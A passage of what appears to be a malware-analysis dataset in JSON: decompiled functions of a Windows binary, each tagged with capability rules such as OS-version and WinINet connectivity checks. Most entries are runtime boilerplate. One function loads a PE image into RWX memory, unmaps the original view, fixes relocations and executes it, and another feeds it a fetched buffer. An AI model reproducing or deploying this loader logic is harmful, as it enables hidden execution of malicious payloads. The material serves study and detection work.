  *ppcVar8 = fcn.00401830;\n                                }\n                            }\n                            else {\n                                *ppcVar8 = fcn.00401810;\n                            }\n                        }\n                        else {\n                            *ppcVar8 = fcn.004017f0;\n                        }\n                    }\n                    else {\n                        *ppcVar8 = fcn.00401800;\n                    }\n                }\n                var_24h = var_24h + 4;\n                var_28h = var_28h + 4;\n            }\n        }\n        uVar5 = CONCAT31(piVar4 >> 8, 1);\n    }\n    return uVar5;\n}\n",
        "token_count": 1127
    },
    "00401df0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.00401df0(int32_t arg_8h, uint noname_1, int32_t arg_10h, uint noname_3, int32_t arg_18h, uint32_t arg_1ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t *arg_ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    piVar5 = fcn.00401790(arg_18h, 5);\n    if (piVar5 == NULL) {\n        var_24h = 0;\n    }\n    else {\n        piVar1 = piVar5[1];\n        iVar2 = *piVar5;\n        var_ch = NULL;\n        while (((var_ch < piVar1 && (piVar5 = var_ch + arg_18h + iVar2,  *piVar5 != 0)) && (piVar5[1] != 0))) {\n            iVar3 = piVar5[1];\n            iVar4 = *piVar5;\n            var_8h = piVar5 + 2;\n            for (var_10h = 0; var_10h < iVar3 - 8U >> 1; var_10h = var_10h + 1) {\n                uVar6 = iVar4 + (*var_8h & 0xfff);\n                if ((var_8h == NULL) || (*var_8h >> 0xc == 0)) break;\n                if (*var_8h >> 0xc != 3) {\n                    uVar6 = fcn.00403c10(\"    [!] Not supported relocations format at %d: %d\\n\", var_10h);\n                    return uVar6 & 0xffffff00;\n                }\n                if (arg_1ch <= uVar6) {\n                    uVar6 = fcn.00403c10(\"    [-] Out of Bound Field: %lx\\n\", uVar6);\n                    return uVar6 & 0xffffff00;\n                }\n                arg_ch = arg_18h + uVar6;\n                fcn.00403c10(\"    [V] Apply Reloc Field at %x\\n\", arg_ch);\n                *arg_ch = (*arg_ch - arg_10h) + arg_8h;\n                var_8h = var_8h + 2;\n            }\n            piVar5 = var_ch + piVar5[1];\n            var_ch = piVar5;\n        }\n        var_24h = var_ch != NULL;\n        var_24h = piVar5 & 0xffffff00 | var_24h;\n    }\n    return var_24h;\n}\n",
        "token_count": 710
    },
    "00401f80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: hModule\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: lpAddress\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: s1\n\nuint __cdecl fcn.00401f80(int32_t s2, uint arg_ch)\n\n{\n    int32_t noname_14;\n    char cVar1;\n    int32_t noname_16;\n    int32_t noname_12;\n    uint noname_11;\n    code *pcVar2;\n    uint uVar3;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    uint in_stack_00000054;\n    uint in_stack_00000058;\n    uint in_stack_0000005c;\n    uint in_stack_00000060;\n    uint in_stack_00000064;\n    uint in_stack_00000068;\n    uint in_stack_0000006c;\n    uint in_stack_00000070;\n    uint in_stack_00000074;\n    uint in_stack_00000078;\n    uint in_stack_0000007c;\n    uint in_stack_00000080;\n    uint in_stack_00000084;\n    uint in_stack_00000088;\n    uint in_stack_0000008c;\n    uint in_stack_00000090;\n    uint in_stack_00000094;\n    uint in_stack_00000098;\n    uint in_stack_0000009c;\n    uint in_stack_000000a0;\n    uint in_stack_000000a4;\n    uint in_stack_000000a8;\n    uint in_stack_000000ac;\n    uint in_stack_000000b0;\n    uint in_stack_000000b4;\n    uint in_stack_000000b8;\n    uint in_stack_000000bc;\n    uint in_stack_000000c0;\n    uint in_stack_000000c4;\n    uint in_stack_000000c8;\n    uint in_stack_000000cc;\n    uint in_stack_000000d0;\n    uint in_stack_000000d4;\n    uint in_stack_000000d8;\n    uint in_stack_000000dc;\n    uint in_stack_000000e0;\n    uint in_stack_000000e4;\n    uint in_stack_000000e8;\n    uint in_stack_000000ec;\n    uint in_stack_000000f0;\n    uint in_stack_000000f4;\n    uint in_stack_000000f8;\n    uint in_stack_000000fc;\n    uint in_stack_00000100;\n    uint in_stack_00000104;\n    uint in_stack_00000108;\n    int32_t noname_1;\n    uint noname_2;\n    uint noname_3;\n    uint noname_4;\n    uint noname_5;\n    char *noname_6;\n    uint noname_7;\n    uint noname_9;\n    uint var_20h;\n    uint hModule;\n    uint var_18h;\n    uint var_14h;\n    uint lpAddress;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t s1;\n    \n    noname_16 = fcn.00401720(s2);\n    if (noname_16 == 0) {\n        uVar3 = 0;\n    }\n    else {\n        noname_12 = fcn.00401790(s2, 5);\n        noname_14 = *(noname_16 + 0x34);\n        noname_9 = 0x41696c;\n        noname_11 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n        uVar3 = *(noname_16 + 0x34);\n        noname_7 = 0xffffffff;\n        noname_6 = \"NtUnmapViewOfSection\";\n        noname_5 = noname_11;\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n        (*pcVar2)();\n        noname_4 = 0x40;\n        noname_3 = 0x3000;\n        noname_2 = *(noname_16 + 0x50);\n        noname_1 = noname_14;\n        s1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)();\n        if ((s1 == 0) && (noname_12 == 0)) {\n            uVar3 = 0;\n        }\n        else {\n            if ((s1 == 0) &&\n               ((noname_12 != 0 &&\n                (s1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, *(noname_16 + 0x50), 0x3000, 0x40),  s1 == 0)))) {\n                return 0;\n            }\n            *(noname_16 + 0x34) = s1;\n            (*_sym.imp.msvcrt.dll_memcpy)(s1, s2, *(noname_16 + 0x54));\n            for (var_ch = 0; var_ch < *(noname_16 + 6); var_ch = var_ch + 1) {\n                (*_sym.imp.msvcrt.dll_memcpy)\n                          (s1 + *(noname_16 + 0x104 + var_ch * 0x28), s2 + *(noname_16 + 0x10c + var_ch * 0x28), \n                           *(noname_16 + 0x108 + var_ch * 0x28));\n            }\n            fcn.00401850(arg_ch, noname_1, noname_2, noname_3, noname_4, noname_5, noname_6, noname_7, uVar3, noname_9, \n                         var_20h, noname_11, noname_12, noname_16 + 0xf8, noname_14, var_ch, noname_16, s1, unaff_EBP, \n                         unaff_retaddr, s2, arg_ch, in_stack_0000000c, in_stack_00000010, in_stack_00000014, \n                         in_stack_00000018, in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, \n                         in_stack_0000002c, in_stack_00000030, in_stack_00000034, in_stack_00000038, in_stack_0000003c, \n                         in_stack_00000040, in_stack_00000044, in_stack_00000048, in_stack_0000004c, in_stack_00000050, \n                         in_stack_00000054, in_stack_00000058, in_stack_0000005c, in_stack_00000060, in_stack_00000064, \n                         in_stack_00000068, in_stack_0000006c, in_stack_00000070, in_stack_00000074, in_stack_00000078, \n                         in_stack_0000007c, in_stack_00000080, in_stack_00000084, in_stack_00000088, in_stack_0000008c, \n                         in_stack_00000090, in_stack_00000094, in_stack_00000098, in_stack_0000009c, in_stack_000000a0, \n                         in_stack_000000a4, in_stack_000000a8, in_stack_000000ac, in_stack_000000b0, in_stack_000000b4, \n                         in_stack_000000b8, in_stack_000000bc, in_stack_000000c0, in_stack_000000c4, in_stack_000000c8, \n                         in_stack_000000cc, in_stack_000000d0, in_stack_000000d4, in_stack_000000d8, in_stack_000000dc, \n                         in_stack_000000e0, in_stack_000000e4, in_stack_000000e8, in_stack_000000ec, in_stack_000000f0, \n                         in_stack_000000f4, in_stack_000000f8, in_stack_000000fc, in_stack_00000100, in_stack_00000104, \n                         in_stack_00000108);\n            fcn.00401b50(s1);\n            if ((s1 != noname_14) &&\n               (cVar1 = fcn.00401df0(s1, 0, noname_14, 0, s1, *(noname_16 + 0x50)),  cVar1 != '\\0')) {\n                (*_sym.imp.msvcrt.dll_puts)(\"[+] Relocation Fixed.\");\n            }\n            uVar3 = (*(s1 + *(noname_16 + 0x28)))();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 2178
    },
    "004023b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004023b0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        uVar1 = 0;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0xfde9, 0, arg_8h, 0xffffffff, 0, 0, 0, 0);\n        if (iVar2 < 1) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = fcn.00402390(iVar2 + 1);\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0xfde9, 0, arg_8h, 0xffffffff, uVar1, iVar2, 0, 0);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 219
    },
    "00402590": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402590(void)\n\n{\n    uint arg_10h;\n    uint arg_ch;\n    int32_t arg_14h;\n    uint var_ch;\n    uint lpString;\n    int32_t var_4h;\n    \n    var_4h = fcn.004024b0(&var_ch);\n    arg_10h = fcn.00402420();\n    arg_14h = var_4h;\n    lpString = arg_10h;\n    arg_ch = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_10h, var_4h, var_ch);\n    fcn.00402340(lpString, arg_ch, arg_10h, arg_14h);\n    if (var_4h != 0) {\n        fcn.00401f80(var_4h, 0);\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "00402d40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402d40(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if ((arg_8h == 0) && (arg_ch != 0)) {\n        iVar2 = fcn.00405830(2, 0x416680, 0x33e, 0, 0x41667c, \"null pointer cannot point to a block of non-zero size\");\n        if (iVar2 == 1) {\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.00405a50(L\"\\\"null pointer cannot point to a block of non-zero size\\\"\", 0x4167ac, 0x4166e8, 0x33e, 0);\n    }\n    fcn.00403230(arg_8h, arg_ch << 1);\n    return;\n}\n",
        "token_count": 218
    },
    "00402df0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402df0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if ((arg_8h == 0) && (arg_ch != 0)) {\n        iVar2 = fcn.00405830(2, 0x416680, 0x33e, 0, 0x41667c, \"null pointer cannot point to a block of non-zero size\");\n        if (iVar2 == 1) {\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.00405a50(L\"\\\"null pointer cannot point to a block of non-zero size\\\"\", 0x4167ac, 0x4166e8, 0x33e, 0);\n    }\n    fcn.00403230(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 215
    },
    "00403a20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403a20(int32_t *param_1)\n\n{\n    uint var_4h;\n    \n    if (*param_1 != 0) {\n        fcn.00402b40();\n    }\n    return;\n}\n",
        "token_count": 54
    },
    "00405480": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00405480(int32_t *param_1)\n\n{\n    uint32_t var_d0h;\n    uint var_8h;\n    \n    var_d0h = *param_1 != 0;\n    return param_1 & 0xffffff00 | var_d0h;\n}\n",
        "token_count": 69
    },
    "00405510": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405510(int32_t *s, int32_t *arg_ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    ulong uVar6;\n    uint var_e0h;\n    uint var_dch;\n    uint var_20h;\n    uint var_14h;\n    int32_t size;\n    \n    puVar5 = &fcn.00405510::var_20h;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0xcccccccc;\n        puVar5 = puVar5 + 1;\n    }\n    if ((*arg_ch != 0) || (*(arg_ch + 1) != '\\0')) {\n        iVar4 = fcn.00405830(2, L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\crt\\\\vcruntime\\\\std_exception.cpp\", *0x419018 + 1, 0\n                             , 0x41322c, L\"to->_What == nullptr && to->_DoFree == false\");\n        if (iVar4 == 1) {\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    if ((*(s + 1) == '\\0') || (*s == 0)) {\n        iVar4 = *s;\n        *arg_ch = iVar4;\n        *(arg_ch + 1) = 0;\n    }\n    else {\n        size = sub.msvcrt.dll_strlen(*s);\n        size = size + 1;\n        uVar3 = sub.msvcrt.dll_malloc(size);\n        fcn.00405380(uVar3);\n        cVar2 = fcn.004053f0();\n        if (cVar2 == '\\0') {\n            uVar6 = fcn.004053b0();\n            iVar4 = uVar6 >> 0x20;\n            arg_ch = uVar6;\n        }\n        else {\n            iVar4 = *s;\n            uVar3 = fcn.00405460();\n            sub.msvcrt.dll_strcpy_s(uVar3, size, iVar4);\n            iVar4 = fcn.00405430();\n            *arg_ch = iVar4;\n            *(arg_ch + 1) = 1;\n            uVar6 = fcn.004053b0();\n            iVar4 = uVar6 >> 0x20;\n            arg_ch = uVar6;\n        }\n    }\n    fcn.00411450(arg_ch, iVar4);\n    size = 0x405643;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 598
    },
    "004056d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004056d0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    int32_t var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.004056d0::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = fcn.00405730();\n    if (var_8h == 0) {\n        (*_sym.imp.msvcrt.dll__amsg_exit)(0x10);\n        fcn.004114b0();\n    }\n    uStack8 = 0x405720;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 192
    },
    "00405730": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00405730(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_d0h;\n    uint var_10h;\n    int32_t var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00405730::var_10h;\n    for (iVar1 = 4; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = sub.msvcrt.dll__errno();\n    var_8h = var_8h + -8;\n    uStack8 = 0x405793;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 175
    },
    "00405850": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_288h\n// WARNING: Variable defined which should be unmapped: var_268h\n// WARNING: Variable defined which should be unmapped: var_28ch\n\nvoid __cdecl fcn.00405850(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint extraout_EDX;\n    uint unaff_ESI;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar2;\n    uint *puStack1268;\n    uint *puStack1264;\n    int32_t iStack1260;\n    uint var_358h;\n    int32_t var_354h;\n    int32_t var_348h;\n    uint *ExceptionInfo;\n    uint *var_338h;\n    uint var_32ch;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_298h;\n    uint var_294h;\n    uint *var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint *var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint32_t var_26ch;\n    uchar *var_268h;\n    uint var_264h;\n    uint s;\n    uint var_54h;\n    uint var_4ch;\n    uint uStack16;\n    uint32_t var_4h;\n    \n    var_290h = &fcn.00405850::var_358h;\n    for (iVar1 = 0xd6; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *var_290h = 0xcccccccc;\n        var_290h = var_290h + 1;\n    }\n    var_4h = *0x41900c ^ &stack0xfffffffc;\n    if (arg_8h != -1) {\n        iStack1260 = arg_8h;\n        puStack1264 = 0x405887;\n        fcn.00404da0();\n    }\n    iStack1260 = 0x50;\n    puStack1264 = NULL;\n    puStack1268 = &fcn.00405850::s;\n    sub.msvcrt.dll_memset();\n    iStack1260 = 0x2cc;\n    puStack1264 = NULL;\n    puStack1268 = &fcn.00405850::var_32ch;\n    sub.msvcrt.dll_memset();\n    ExceptionInfo = &fcn.00405850::s;\n    var_338h = &fcn.00405850::var_32ch;\n    var_26ch = (in_NT & 1) * 0x4000 | SCARRY4(&stack0xfffffb0c, 0xc) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100\n               | (&stack0xfffffb18 < 0) * 0x80 | (*0x10 == 0x4e8) * 0x40 | (in_AF & 1) * 0x10 |\n               ((POPCOUNT(&stack0xfffffb18 & 0xff) & 1U) == 0) * 4 | 0xfffffff3 < &stack0xfffffb0c |\n               (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    var_32ch = 0x10001;\n    s = arg_ch;\n    var_54h = arg_10h;\n    iStack1260 = 0x40595c;\n    var_284h = extraout_EDX;\n    var_27ch = var_338h;\n    var_268h = *0x10;\n    (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    iStack1260 = 0x405963;\n    var_348h = fcn.004114b0();\n    iStack1260 = 0;\n    puStack1264 = 0x405973;\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)();\n    puStack1264 = 0x40597a;\n    fcn.004114b0();\n    puStack1264 = &fcn.00405850::ExceptionInfo;\n    puStack1268 = 0x405989;\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)();\n    puStack1268 = 0x405990;\n    uVar2 = fcn.004114b0();\n    var_354h = uVar2;\n    if (((var_354h == 0) && (var_348h == 0)) && (arg_8h != -1)) {\n        puStack1268 = arg_8h;\n        uVar2 = fcn.00404da0();\n    }\n    puStack1268 = uVar2 >> 0x20;\n    fcn.00411450(uVar2);\n    fcn.00405180(unaff_ESI);\n    uStack16 = 0x4059e5;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 1236
    },
    "00405a50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405a50(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_FS_OFFSET;\n    uint var_dch;\n    uint var_1ch;\n    uint uStack28;\n    code *var_14h;\n    code *var_8h;\n    \n    puVar2 = &fcn.00405a50::var_1ch;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = *(*(*(in_FS_OFFSET + 0x2c) + *0x419624 * 4) + 4);\n    if (var_8h == NULL) {\n        var_14h = *0x419550;\n        if (*0x419550 == NULL) {\n            fcn.00405b70(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n        }\n        else {\n            (**0x419550)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            fcn.004114b0();\n        }\n    }\n    else {\n        (*var_8h)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n        fcn.004114b0();\n    }\n    uStack28 = 0x405b22;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 381
    },
    "00405fa0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405fa0(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint arg_ch;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_108h;\n    uint32_t var_104h;\n    uint var_fch;\n    uint var_48h;\n    uint32_t var_20h;\n    uint uStack28;\n    uint32_t var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x412750;\n    var_ch = *in_FS_OFFSET;\n    puVar3 = &fcn.00405fa0::var_48h;\n    for (iVar4 = 0xf; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    uVar2 = *0x41900c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.00405fa0::var_ch;\n    var_104h = arg_10h != 0;\n    var_14h = var_104h;\n    if ((var_104h == 0) &&\n       (iVar4 = fcn.00405830(2, L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\stdio\\\\output.cpp\", 0x22, 0, 0x41322c, \n                             L\"stream != nullptr\", uVar2),  iVar4 == 1)) {\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (var_14h == 0) {\n        puVar3 = sub.msvcrt.dll__errno();\n        *puVar3 = 0x16;\n        fcn.00405a50(L\"stream != nullptr\", L\"common_vfprintf\", \n                     L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\stdio\\\\output.cpp\", 0x22, 0);\n    }\n    else {\n        var_104h = arg_14h != 0;\n        var_20h = var_104h;\n        if ((var_104h == 0) &&\n           (iVar4 = fcn.00405830(2, L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\stdio\\\\output.cpp\", 0x23, 0, 0x41322c, \n                                 L\"format != nullptr\", uVar2),  iVar4 == 1)) {\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        if (var_20h == 0) {\n            puVar3 = sub.msvcrt.dll__errno();\n            *puVar3 = 0x16;\n            fcn.00405a50(L\"format != nullptr\", L\"common_vfprintf\", \n                         L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\stdio\\\\output.cpp\", 0x23, 0);\n        }\n        else {\n            arg_ch = fcn.00406cc0(&fcn.00405fa0::arg_10h, &fcn.00405fa0::arg_8h, &fcn.00405fa0::arg_14h, \n                                  &fcn.00405fa0::arg_18h, &fcn.00405fa0::arg_1ch);\n            fcn.00405ef0(arg_10h, arg_ch);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    uStack28 = 0x40613a;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 890
    },
    "00406a00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00406a00(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    uint var_29h;\n    char **var_20h;\n    char *var_14h;\n    int32_t var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.00406a00::var_30h;\n    for (iVar2 = 0xc; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = fcn.004061b0();\n    iVar1 = fcn.00406150();\n    var_14h = iVar2 + -1 + iVar1;\n    var_20h = fcn.00408c80();\n    *var_20h = var_14h;\n    while ((0 < *(var_8h + 0x28) || (arg_8h != 0))) {\n        *(var_8h + 0x28) = *(var_8h + 0x28) + -1;\n        var_29h._0_1_ = arg_8h % arg_ch + '0';\n        arg_8h = arg_8h / arg_ch;\n        if ('9' < var_29h) {\n            var_29h._0_1_ = fcn.00407500(var_29h, arg_10h & 0xff);\n        }\n        **var_20h = var_29h;\n        *var_20h = *var_20h + -1;\n    }\n    *(var_8h + 0x38) = var_14h - *var_20h;\n    *var_20h = *var_20h + 1;\n    uStack8 = 0x406aeb;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 476
    },
    "00406b00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
